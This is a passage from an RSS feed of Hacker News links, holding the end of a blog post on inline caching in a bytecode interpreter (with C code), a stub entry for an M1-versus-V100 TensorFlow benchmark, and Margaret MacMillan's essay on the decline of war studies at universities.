        <span>PUSH</span><span>(</span><span>result</span><span>);</span>
        <span>break</span><span>;</span>
      <span>}</span>
      <span>case</span> <span>PRINT</span><span>:</span> <span>{</span>
        <span>Object</span> <span>obj</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Method</span> <span>method</span> <span>=</span> <span>lookup_method</span><span>(</span><span>obj</span><span>.</span><span>type</span><span>,</span> <span>kPrint</span><span>);</span>
        <span>(</span><span>*</span><span>method</span><span>)(</span><span>obj</span><span>);</span>
        <span>break</span><span>;</span>
      <span>}</span>
      <span>case</span> <span>HALT</span><span>:</span>
        <span>return</span><span>;</span>
      <span>default:</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"unknown opcode %d</span><span>\n</span><span>"</span><span>,</span> <span>op</span><span>);</span>
        <span>abort</span><span>();</span>
    <span>}</span>
    <span>pc</span> <span>+=</span> <span>kBytecodeSize</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Both <code>ADD</code> and <code>PRINT</code> make use of <code>lookup_method</code> to find out what function
pointer corresponds to the given <code>(type, symbol)</code> pair. Both opcodes throw away
the result. How sad. Let’s figure out how to save some of that data. Maybe we
can use the <code>caches</code> slot in <code>Code</code>.</p>

<h3 id="inline-caching-strategy">Inline caching strategy</h3>

<p>Since the Smalltalk-80 paper tells us that the receiver type is unlikely to
change from call to call at a given point in the bytecode, let’s cache <em>one</em>
method address per opcode. As with any cache, we’ll have to store both a key
(the object type) and a value (the method address).</p>

<p>There are several states that the cache could be in when entering the an
opcode:</p>

<ol>
  <li><strong>If it is empty</strong>, look up the method and store it in the cache using the
current type as a cache key. Use the cached value.</li>
  <li><strong>If it has an entry and the entry is for the current type</strong>, use the cached
value.</li>
  <li>Last, <strong>if it has an entry and the entry is for a different …</strong></li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bernsteinbear.com/blog/inline-caching/">https://bernsteinbear.com/blog/inline-caching/</a></em></p>]]>
            </description>
            <link>https://bernsteinbear.com/blog/inline-caching/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773724</guid>
            <pubDate>Thu, 14 Jan 2021 08:35:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing the performance of Tensorflow training on M1 Mac Mini and Nvidia V100]]>
            </title>
            <description>
<![CDATA[
Score 224 | Comments 91 (<a href="https://news.ycombinator.com/item?id=25773109">thread link</a>) | @briggers
<br/>
January 13, 2021 | https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg | <a href="https://web.archive.org/web/*/https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773109</guid>
            <pubDate>Thu, 14 Jan 2021 07:04:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If you want peace, study war]]>
            </title>
            <description>
<![CDATA[
Score 205 | Comments 202 (<a href="https://news.ycombinator.com/item?id=25772365">thread link</a>) | @ascertain
<br/>
January 13, 2021 | https://www.persuasion.community/p/if-you-want-peace-study-war-533 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/if-you-want-peace-study-war-533">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg&quot;,&quot;height&quot;:960,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1194587,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><strong>“War…What is it good for?” </strong>the classic song asks. Many universities agree on the answer: “Absolutely nothing.”</p><p>Although anthropologists and archeologists still wonder why human beings have for so long organized themselves to fight, the study of war in history and political science departments is fading. Senior scholars are retiring and not being replaced, or their posts are allocated to other fields of history. Each year, fewer courses are offered on great conflicts such as the Napoleonic wars, the total wars of the 20th century, and the Cold War. The Second World War, you may hear on campus, “has been done.”</p><p>Yet war remains one of the events—along with revolution, famine, financial collapse and, as we are learning again, pandemics—that change the course of history. In privileged countries, we forget the importance of military conflicts because we have enjoyed the “Long Peace” that followed the Second World War. Other places have not been so fortunate, with wars around the world almost every year since 1945, bringing millions of deaths and creating millions more refugees. Meanwhile, the world’s great powers maintain large military establishments, and still prepare for battle. </p><p>It is as important as ever to understand war—its causes, nature and consequences—and the many ways that conflicts have shaped our societies. The conquering armies that came from the Arabian Peninsula in the 7th century after the Prophet Mohammad’s death created new empires and spread the new religion of Islam across the Middle East, North Africa and the Iberian Peninsula. The Seven Years’ War (1756-1763), a global conflict, laid the foundations for the dominance of the British Empire and the bankruptcy of France, which helped to fuel the French Revolution.&nbsp; </p><p>War can also speed up advances in science and technology that have benefits in peacetime. Think of the development of penicillin, blood transfusions, radar, or the transistor. And war can bring about significant social change, often for the better. The need for mass armies in the 19th and 20th centuries meant that governments had to treat the lower classes better, whether by educating them or by improving public health. In many countries that fought in the two world wars, ruling classes recognized the contributions of women and the working classes, granting them the franchise and introducing social benefits. </p><p>So why do history faculties, which accept the need to study other great forces in history, such as changes in the means of production or systems of belief, shy from war? I suspect that horror at the phenomenon itself has affected universities’ willingness to treat it as a subject for scholarship. Years ago, when I proposed a new course on war and society, an education consultant asked me, “Why don’t you call it peace studies?” </p><p>I have since met with incomprehension, even hostility, when I have pointed out that wars can bring unintended benefits. However much I say that we would not <em>choose</em> to make war in order to improve our societies, I am charged with loving war. Yet nobody would say that the study of imperialism, racism or famine means that we think those are good things.</p><p><strong>The history of war is neglected for other reasons, too. </strong>First, separate histories—of women, emotions, food and the environment, for example—have come along. Quite rightly, room has been made for them in the big and eclectic house that is the study of the past. However, part of the shift away from war studies owes to the quest for “social justice”—intended as a drive for radical change in society at large—that has taken root in many history faculties. </p><p>Here, for example, is how the chair of Historical and Cultural Studies at the Scarborough campus of the University of Toronto, Natalie Rothman, <a href="https://www.utsc.utoronto.ca/hcs/">welcomed students</a> this autumn: “As a department, we have strengthened our resolve to confront racism, colonialism and Islamophobia throughout our curriculum and in our co-curricular initiatives.” The University of Berkeley in California <a href="https://history.berkeley.edu/graduate/prospective-students/admissions">asks prospective graduate students</a> to provide “evidence of how you have come to understand the barriers faced by others, evidence of your academic service to advance equitable access to higher education for women, racial minorities, and individuals from other groups that have been historically underrepresented in higher education, evidence of your research focusing on underserved populations or related issues of inequality, or evidence of your leadership among such groups.” It is hard to quarrel with such goals, but their impact on curriculum has been to <a href="http://www.nytimes.com/2016/08/29/opinion/why-did-we-stop-teaching-political-history.html?smid=em-share">downgrade subjects such as political and military history,</a> which are seen as too focused on elites and complicit with hierarchy and oppression. </p><p>Another factor is that history overall is worryingly in decline as an academic subject. While it remains popular among publishers and readers, enrollments in history majors are significantly down. They have <a href="https://www.historians.org/publications-and-directories/perspectives-on-history/december-2018/the-history-ba-since-the-great-recession-the-2018-aha-majors-report">dropped more than any other major</a> in the humanities—perhaps by as much as <a href="http://www.chronicle.com/article/why-are-students-ditching-the-history-major">one-third</a> in <a href="https://www.insidehighered.com/news/2018/11/27/new-analysis-history-major-data-says-field-new-low-can-it-be-saved">American universities</a> in the past decade. At the University of Toronto, where I am a professor, colleagues fear that history enrollment may be down as much as 50% over the same period. Even in the United Kingdom, where history remains popular among undergraduates, the number of those majoring in history has dropped by about <a href="https://www.economist.com/britain/2019/07/18/the-study-of-history-is-in-decline-in-britain">one-tenth</a> in the past decade. </p><p>Part of the reason is that, given the lingering effects of the 2008 financial crisis and uncertainty over the economy, students and their parents want university courses to lead to jobs. The decline in history students in turn affects university hiring, and the fewer the tenured faculty, the fewer places for the doctoral students who are the future of the profession.&nbsp; </p><p>Faculties and administrators are not necessarily helping matters, reluctant to include popular courses on war in the curriculum, or to support well-established centers for the study of conflict, some of which are being remodeled, such as the Laurier Centre for Military, Strategic and Disarmament Studies, in Waterloo, Ontario, which will focus more on Canadian history; another at the University of Calgary is fading as those who retire are not replaced. This seems to be particularly true of elite universities. War studies remains in better health at military colleges or some second-tier public universities, while schools of public policy are also still teaching military history, strategic studies and diplomatic history. </p><p>But those in other fields stereotype war studies, characterizing it as too narrowly focused on tactics, battles, or “toys for boys,” meaning armaments. If that caricature were ever true, it has not been for decades. The great historian Sir Michael Howard, who pioneered the modern study of war and trained generations of historians, always insisted that what he was doing was to consider wars within their social and political contexts as a part of the great sweep of history, not somehow separate from it. &nbsp;</p><p><strong>My own evidence of the distaste for military and diplomatic history </strong>at North American universities comes from tales exchanged privately among fellow academics. One retired Canadian military historian recounted that his old faculty had asked him how to reverse the collapse in enrollment. He suggested a course in military history, but the response was a flat no. When a university in the Maritime provinces of eastern Canada was offered a fully funded post in naval history a few years ago—a good fit in a port town that had been deeply affected by conflict on the Atlantic—members of the department rejected it. </p><p>Yet, despite the overall downturn in university history programs, we know from course enrollments that students are interested in war, as indeed they are in international relations, when they get the chance to study them: At Yale, Paul Kennedy’s “Military History of the West” attracted large crowds; at Toronto’s Ryerson University, international relations courses are the most popular choices among students.</p><p>I would not suggest that student preference should determine what departments offer. But they should at least be listened to. Much more important is what we, as societies, want our future leaders to know. Political history, diplomatic history and the study of war—they all offer critical warnings and instructive analogies to our times. Social and cultural histories, and history from the bottom up, add to our understanding too. But we need balance, and a sense of how the micro- and macro-histories mesh with each other. </p><p>Do we really want citizens who have so little knowledge of how war helped to shape our values and societies and our world? Do we ever want another president asking, as Donald Trump <a href="https://www.businessinsider.com/trump-pearl-harbor-memorial-tour-john-kelly-stable-genius-2020-1?r=US&amp;IR=T">did</a> during a visit to the Pearl Harbor memorial: “What’s this all about? What’s this a tour of?” </p><p>If we aren’t aware of how wars happen, we may fail to recognize warning signs when the next conflict brews, as it will. </p><p><strong>Margaret MacMillan is a professor of history at the University of Toronto and emeritus professor at the University of Oxford. Her latest book, </strong><em><strong><a href="https://www.penguinrandomhouse.com/books/609692/war-how-conflict-shaped-us-by-margaret-macmillan/">War: How Conflict Shaped Us</a></strong></em><strong>, was among the </strong><em><strong>New York Times</strong></em><strong> 10 Best Books of 2020. </strong></p></div></div>]]>
            </description>
            <link>https://www.persuasion.community/p/if-you-want-peace-study-war-533</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772365</guid>
            <pubDate>Thu, 14 Jan 2021 05:10:46 GMT</pubDate>
        </item>
    </channel>
</rss>
